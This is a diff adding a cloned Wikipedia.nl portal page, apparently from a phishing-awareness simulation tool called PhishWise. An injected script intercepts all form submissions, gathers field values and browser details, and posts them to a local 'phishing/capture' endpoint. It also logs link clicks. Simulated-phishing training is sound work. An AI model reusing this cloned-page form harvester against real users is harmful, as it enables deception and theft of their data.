@@ -1,0 +1,284 @@
+<!DOCTYPE html><html class="has-js has-mouse"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="https://www.wikipedia.nl/favicon.ico">
+    <link rel="license" href="https://creativecommons.org/licenses/by-sa/3.0/">
+    <title>Wikipedia.nl</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:rgba(0,0,0,0)}html{font-size:10px}@media (max-width: 767px){html{font-size:8px}}@media (max-height: 650px){html{font-size:8px}}body{background-color:white;color:black;overflow-x:hidden}img{border:0}button{outline:none;cursor:pointer;background:none;border:0}input,select,textarea,button{font:inherit}body{font-family:'Helvetica Neue', 'Helvetica', 'Arial', sans-serif;background:white;color:#333}a{text-decoration:none}html.has-mouse a:hover{text-decoration:underline}.page{margin-left:auto;margin-right:auto;max-width:80rem;padding:2rem}.footer{margin-top:3rem;border-top:2px solid #ccc;padding:3rem 0;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;font-size:1.4rem;line-height:1.5}.footer__logo{width:7rem}.footer__logo img{width:100%}.footer__small{margin-top:2rem;display:flex}.footer__small a{color:#999;margin:0 1rem}.button{border:1px solid #36c;border-radius:2px;font-weight:bold;font-weight:500;line-height:1;padding:1rem 2rem;text-align:center;display:flex;align-items:center;justify-content:center;flex-direction:row}.button__icon{width:2rem;margin-right:.5rem}.button__wrapper{display:flex;align-items:center;justify-content:center;flex-direction:column}.button--toggle{margin:2rem auto 0 auto;font-size:1.6rem;background:#f8f9fa;color:#36c}html.has-mouse .button--toggle:hover{background:white}.button--action{background:#36c;color:white}@media (max-width: 767px){.button--action{padding:0 2rem !important}.button--action .button__icon{margin-right:0;width:2.5rem}.button--action span{display:none}}html.has-mouse .button--action:hover{background:#447ff5}.all-languages{text-align:center;margin-top:1rem}html.has-js .all-languages{transition:1s;overflow:hidden}.all-languages li{display:inline-block;padding:0 1rem;font-size:1.4rem;line-height:1.5}html.has-js .all-languages[data-toggle-state="hidden"]{max-height:0}html.has-js .all-languages[data-toggle-state="show"]{max-height:1000px}.logo{display:flex;align-items:center;justify-content:center;flex-direction:column}.logo__image{width:22rem}.search{display:flex;align-items:center;justify-content:center;flex-direction:column}.search,.search>*{width:100%;margin-top:1rem}.search__input{font-size:16px;padding:1rem;border:1px solid #ccc}.search__options{display:flex;align-items:center;justify-content:center;flex-direction:row}.search__language,.search__button{font-size:16px;padding:1rem 2rem;height:4.5rem;margin:0 1rem}.languages{margin-top:4rem}.languages__list{display:flex;justify-content:center;flex-wrap:wrap;list-style:none}.languages__list li{width:calc(100% / 3);margin-bottom:1rem;text-align:center;padding:0 .5rem}@media (max-width: 399px){.languages__list li{width:50%}}.languages a{font-size:1.6rem;font-weight:500}
+
+    </style>
+    <!-- version: nl -->
+</head>
+<body>
+    <div class="page">
+        <div class="logo">
+            <a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">
+                <img class="logo__image" src="https://www.wikipedia.nl/assets/wikipedia/commons/thumb/f/f6/Wikipedia-logo-v2-wordmark.svg/500px-Wikipedia-logo-v2-wordmark.svg.png" alt="Wikipedia logo">
+            </a>
+        </div>
+
+        <form method="get" class="search" role="form" action="https://www.wikipedia.org/search-redirect.php">
+
+            <input type="text" id="search" name="search" class="search__input">
+
+            <menu class="search__options">
+                <select class="search__language" name="language" id="language">
+                    <option value="nl">Nederlands</option>
+                    <option value="fy">Frysk</option>
+                    <option value="en">English</option>
+                    <option value="srn">Sranantongo (Surinaams)</option>
+                    <option value="nds-nl">Nedersaksisch</option>
+                    <option value="li">Limburgs</option>
+                    <option value="pap">Papiaments</option>
+                    <option value="ksh">Ripuarisch</option>
+                    <option value="zea">Zeêuws</option>
+                </select>
+
+                <button class="search__button button button--action" type="submit">
+                    <img src="https://www.wikipedia.nl/assets/wikipedia/commons/thumb/5/5d/OOjs_UI_indicator_search-ltr-invert.svg/60px-OOjs_UI_indicator_search-ltr-invert.svg.png" class="button__icon" alt="Search icon">
+                    <span>
+                        Zoeken in Wikipedia
+                    </span>
+                </button>
+            </menu>
+        </form>
+
+        <div class="languages">
+            <ul class="languages__list">
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Nederlands</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Frysk</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">English</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Sranantongo (Surinaams)</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Nedersaksisch</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Limburgs</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Papiaments</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Ripuarisch</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Zeêuws</a></li>
+            </ul>
+        </div>
+
+        <div class="button__wrapper">
+            <a href="#all-languages" data-toggle="" class="button button--toggle">
+                <img src="https://www.wikipedia.nl/assets/wikipedia/commons/thumb/e/e0/OOjs_UI_icon_language-ltr-progressive.svg/60px-OOjs_UI_icon_language-ltr-progressive.svg.png" class="button__icon" alt="Translation icon">
+                <span>
+                    meer talen
+                    
+                </span>
+            </a>
+        </div>
+
+        <ul id="all-languages" class="all-languages" data-toggle-state="hidden">
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">العربية</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Български</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Català</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Sinugboanong</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Česky</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Dansk</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Deutsch</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">English</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Esperanto</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Español</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Eesti</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Euskara</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">فارسی</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Suomi</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Français</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Frysk</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Galego</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">עברית</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">हिन्दी</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Hrvatski</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Magyar</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Հայերեն</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Bahasa Indonesia</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Italiano</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">日本語</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Қазақша / Qazaqşa / قازاقشا</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">한국어</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Ripuarisch</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Latina</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Lëtzebuergesch</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Limburgs</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Lietuvių</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Baso Minangkabau</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Bahasa Melayu</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Nedersaksisch</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Nederlands</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Norsk (nynorsk)</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Norsk (bokmål)</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Papiaments</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Picard</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Polski</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Português</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Română</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Русский</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Саха Тыла</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Srpskohrvatski / Српскохрватски</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Simple English</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Slovenčina</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Slovenščina</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Српски / Srpski</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Sranantongo (Surinaams)</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Svenska</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Türkçe</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Українська</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Oʻzbekcha</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Tiếng Việt</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">West-Vlams</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Volapük</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Walon</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Winaray</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Yiddish</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Zeêuws</a></li>
+                <li><a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">中文</a></li>
+        </ul>
+
+        <footer class="footer">
+            <a class="footer__logo" href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">
+                <img src="https://www.wikipedia.nl/assets/wikipedia/commons/thumb/8/81/Wikimedia-logo.svg/200px-Wikimedia-logo.svg.png" alt="Wikimedia logo">
+            </a>
+
+            <p>
+                <a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Wikimedia Nederland</a> ondersteunt Wikipedia in Nederland.
+            </p>
+
+            <p>
+                Wikipedia is een project van de <a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">Wikimedia Foundation</a>.
+            </p>
+
+
+            <p>
+                <small class="footer__small">
+                    <a href="https://www.wikipedia.nl/archive/nl.html">old version</a>
+                    <a href="#" onclick="window.customAlert('External link disabled for simulation'); return false;">code</a>
+                </small>
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        !function(){function n(t){return document.querySelector(t)}function t(){var t,e;t="[data-toggle]",e=document.querySelectorAll(t),Array.prototype.slice.call(e).forEach(function(t){t.addEventListener("click",function(t){t.preventDefault();var e=n(t.currentTarget.attributes.href.value),a=e.dataset.toggleState;e.dataset.toggleState="hidden"===a?"show":"hidden"},!1)})}var e,a;n("html").classList.add("has-js"),n("#search").focus(),t(),"ontouchend"in window?n("html").classList.add("has-touch"):n("html").classList.add("has-mouse"),e="",a="38384040373937396665",document.addEventListener("keydown",function(t){(e+=""+t.keyCode)===a&&(// window.location disabled),a.indexOf(e)&&(e=""+t.keyCode)})}();
+    </script>
+
+
+    <script>
+      (function() {
+        // Custom alert function to replace native alert()
+        window.customAlert = function(message) {
+          console.log('Custom Alert:', message);
+          // You can implement a more sophisticated modal/message box here if needed.
+          // For now, it just logs to console.
+          // Example: alert(message); // If you still want the native alert for simulation
+        };
+
+        console.log('🎯 PhishWise Universal Tracking activated');
+
+        // Wait for DOM to be ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking);
+        } else {
+          initTracking();
+        }
+
+        function initTracking() {
+          // Intercept all forms
+          const forms = document.querySelectorAll('form');
+          console.log('📝 Forms detected:', forms.length);
+
+          forms.forEach(function(form, index) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              console.log('📋 Form submission intercepted:', index);
+
+              // Collect all form data
+              const formData = new FormData(form);
+              const data = {};
+
+              // Extract data from inputs
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
+              const inputs = form.querySelectorAll('input, select, textarea');
+              inputs.forEach(function(input) {
+                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
+                  if (input.type === 'checkbox' || input.type === 'radio') {
+                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
+                  } else {
+                    data[input.name] = input.value;
+                  }
+                }
+              });
+
+              // Tracking metadata
+              data._campaignId = '68b186303f30b0aa25e8837c';
+              data._timestamp = new Date().toISOString();
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+              data._formIndex = index;
+              data._formAction = form.action || 'N/A';
+              data._formMethod = form.method || 'GET';
+
+              console.log('📊 Collected data:', data);
+
+              // Send data
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function(response) {
+                console.log('✅ Data sent successfully');
+                // Redirect to learning page
+                window.location.href = 'http://localhost:3000/learning/68b186303f30b0aa25e8837c';
+              }).catch(function(error) {
+                console.error('❌ Error sending data:', error);
+                // Redirect even on error
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/68b186303f30b0aa25e8837c';
+                }, 1000);
+              });
+            });
+          });
+
+          // Track link clicks
+          document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link) {
+              const href = link.href;
+              console.log('🔗 Link clicked:', href);
+
+              // Send click event
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '68b186303f30b0aa25e8837c',
+                  clickedUrl: href,
+                  linkText: link.textContent.trim(),
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+
+          // Track input field interactions (focus)
+          const inputs = document.querySelectorAll('input, textarea, select');
+          inputs.forEach(function(input) {
+            input.addEventListener('focus', function() {
+              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
+            });
+          });
+
+          console.log('🚀 Universal tracking initialized');
+        }
+      })();
+    </script>
+</body></html>
